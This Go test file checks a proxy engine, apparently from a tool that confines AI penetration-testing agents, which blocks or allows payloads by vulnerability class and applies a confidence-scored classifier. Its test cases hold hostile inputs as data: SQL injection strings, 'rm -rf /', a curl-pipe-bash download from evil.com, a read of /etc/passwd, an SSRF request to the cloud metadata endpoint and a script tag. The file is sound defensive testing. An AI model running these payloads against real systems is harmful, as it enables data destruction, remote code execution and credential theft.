package enforcement

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/okedeji/agentcage/internal/config"
)

func loadTestConfig(t *testing.T) *config.Config {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "..", "agentcage.yaml"))
	require.NoError(t, err)
	cfg, err := config.Default(data)
	require.NoError(t, err)
	return cfg
}

func patternsFromConfig(cfg *config.Config, vulnClass string) map[string]string {
	entries := cfg.BlocklistPatterns[vulnClass]
	patterns := make(map[string]string, len(entries))
	for _, e := range entries {
		patterns[e.Pattern] = e.Message
	}
	return patterns
}

func TestProxyEngine_Inspect(t *testing.T) {
	cfg := loadTestConfig(t)

	tests := []struct {
		name         string
		vulnClass    string
		method       string
		url          string
		body         string
		wantDecision PayloadDecision
		wantBlocked  bool
		wantContains string
	}{
		{
			name:         "sqli: benign SELECT allowed",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "SELECT * FROM users WHERE id=1",
			wantDecision: PayloadAllow,
		},
		{
			name:         "sqli: DROP TABLE blocked",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "'; DROP TABLE users; --",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "DROP",
		},
		{
			name:         "sqli: DELETE FROM blocked",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "'; DELETE FROM users; --",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "DELETE",
		},
		{
			name:         "sqli: time-based injection allowed",
			vulnClass:    "sqli",
			method:       "POST",
			url:          "http://target.com/api",
			body:         "1' OR SLEEP(5)--",
			wantDecision: PayloadAllow,
		},
		{
			name:         "rce: whoami allowed",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "whoami",
			wantDecision: PayloadAllow,
		},
		{
			name:         "rce: rm -rf blocked",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "rm -rf /",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "rm -rf",
		},
		{
			name:         "rce: cat /etc/passwd allowed",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "cat /etc/passwd",
			wantDecision: PayloadAllow,
		},
		{
			name:         "rce: curl pipe bash blocked",
			vulnClass:    "rce",
			method:       "POST",
			url:          "http://target.com/exec",
			body:         "curl http://evil.com/shell.sh | bash",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "remote code download",
		},
		{
			name:         "ssrf: public URL allowed",
			vulnClass:    "ssrf",
			method:       "GET",
			url:          "http://example.com/api",
			body:         "",
			wantDecision: PayloadAllow,
		},
		{
			name:         "ssrf: private IP in body blocked",
			vulnClass:    "ssrf",
			method:       "POST",
			url:          "http://target.com/fetch",
			body:         "url=http://10.0.0.5/admin",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "private IP",
		},
		{
			name:         "ssrf: metadata endpoint in URL blocked",
			vulnClass:    "ssrf",
			method:       "GET",
			url:          "http://169.254.169.254/metadata",
			body:         "",
			wantDecision: PayloadBlock,
			wantBlocked:  true,
			wantContains: "metadata",
		},
		{
			name:         "xss: script tag allowed",
			vulnClass:    "xss",
			method:       "POST",
			url:          "http://target.com/comment",
			body:         "<script>alert(1)</script>",
			wantDecision: PayloadAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			patterns := patternsFromConfig(cfg, tt.vulnClass)
			engine, err := NewProxyEngine(tt.vulnClass, patterns, nil)
			require.NoError(t, err)

			decision, msg := engine.Inspect(tt.method, tt.url, []byte(tt.body))
			assert.Equal(t, tt.wantDecision, decision)
			if tt.wantBlocked {
				assert.Contains(t, msg, tt.wantContains)
			}
		})
	}
}

func TestProxyEngine_NilPatterns(t *testing.T) {
	engine, err := NewProxyEngine("unknown", nil, nil)
	require.NoError(t, err)

	decision, msg := engine.Inspect("GET", "http://anything.com", []byte("anything"))
	assert.Equal(t, PayloadAllow, decision)
	assert.Empty(t, msg)
}

func TestProxyEngine_InvalidRegex(t *testing.T) {
	patterns := map[string]string{
		"[invalid": "should fail",
	}
	_, err := NewProxyEngine("test", patterns, nil)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "compiling pattern")
}

func TestProxyEngine_ConcurrentInspect(t *testing.T) {
	cfg := loadTestConfig(t)
	patterns := patternsFromConfig(cfg, "sqli")
	engine, err := NewProxyEngine("sqli", patterns, nil)
	require.NoError(t, err)

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			decision, _ := engine.Inspect("POST", "http://target.com", []byte("SELECT 1"))
			assert.Equal(t, PayloadAllow, decision)
		}()
	}
	wg.Wait()
}

func classifyServer(t *testing.T, handler http.HandlerFunc) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(handler)
	t.Cleanup(srv.Close)
	return srv
}

func TestInspectWithClassification_BlocklistBlocksBeforeClassification(t *testing.T) {
	patterns := map[string]string{`DROP\s+TABLE`: "DROP TABLE blocked"}
	engine, err := NewProxyEngine("sqli", patterns, &ProxyClassifyConfig{
		Batcher:     NewPayloadBatcher(NewClassificationClient("http://unused", 5*time.Second), 100*time.Millisecond, 10),
		Threshold:   0.8,
		OnUncertain: PayloadHold,
	})
	require.NoError(t, err)

	decision, reason, err := engine.InspectWithClassification(context.Background(), "POST", "http://target.com", []byte("DROP TABLE users"))
	require.NoError(t, err)
	assert.Equal(t, PayloadBlock, decision)
	assert.Contains(t, reason, "DROP TABLE")
}

func TestInspectWithClassification_HighConfidenceAllows(t *testing.T) {
	srv := classifyServer(t, func(w http.ResponseWriter, r *http.Request) {
		resp := ClassificationResponse{
			Results: []ClassificationResult{{Safe: true, Confidence: 0.95, Reason: ""}},
		}
		json.NewEncoder(w).Encode(resp)
	})

	client := NewClassificationClient(srv.URL, 5*time.Second)
	batcher := NewPayloadBatcher(client, 50*time.Millisecond, 10)
	engine, err := NewProxyEngine("sqli", nil, &ProxyClassifyConfig{
		Batcher:     batcher,
		Threshold:   0.8,
		OnUncertain: PayloadHold,
	})
	require.NoError(t, err)

	decision, _, err := engine.InspectWithClassification(context.Background(), "POST", "http://target.com", []byte("benign"))
	require.NoError(t, err)
	assert.Equal(t, PayloadAllow, decision)
}

func TestInspectWithClassification_LowConfidenceHolds(t *testing.T) {
	srv := classifyServer(t, func(w http.ResponseWriter, r *http.Request) {
		resp := ClassificationResponse{
			Results: []ClassificationResult{{Safe: false, Confidence: 0.3, Reason: "suspicious pattern"}},
		}
		json.NewEncoder(w).Encode(resp)
	})

	client := NewClassificationClient(srv.URL, 5*time.Second)
	batcher := NewPayloadBatcher(client, 50*time.Millisecond, 10)
	engine, err := NewProxyEngine("sqli", nil, &ProxyClassifyConfig{
		Batcher:     batcher,
		Threshold:   0.8,
		OnUncertain: PayloadHold,
	})
	require.NoError(t, err)

	decision, reason, err := engine.InspectWithClassification(context.Background(), "POST", "http://target.com", []byte("weird"))
	require.NoError(t, err)
	assert.Equal(t, PayloadHold, decision)
	assert.Equal(t, "suspicious pattern", reason)
}

func TestInspectWithClassification_NilBatcherAllows(t *testing.T) {
	engine, err := NewProxyEngine("sqli", nil, nil)
	require.NoError(t, err)

	decision, reason, err := engine.InspectWithClassification(context.Background(), "POST", "http://target.com", []byte("anything"))
	require.NoError(t, err)
	assert.Equal(t, PayloadAllow, decision)
	assert.Empty(t, reason)
}

func TestInspectWithClassification_ContextCancellation(t *testing.T) {
	srv := classifyServer(t, func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(5 * time.Second)
	})

	client := NewClassificationClient(srv.URL, 10*time.Second)
	batcher := NewPayloadBatcher(client, 50*time.Millisecond, 10)
	engine, err := NewProxyEngine("sqli", nil, &ProxyClassifyConfig{
		Batcher:     batcher,
		Threshold:   0.8,
		OnUncertain: PayloadHold,
	})
	require.NoError(t, err)

	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	decision, reason, err := engine.InspectWithClassification(ctx, "POST", "http://target.com", []byte("slow"))
	assert.Equal(t, PayloadBlock, decision)
	assert.Equal(t, "classification timeout", reason)
	assert.ErrorIs(t, err, context.DeadlineExceeded)
}
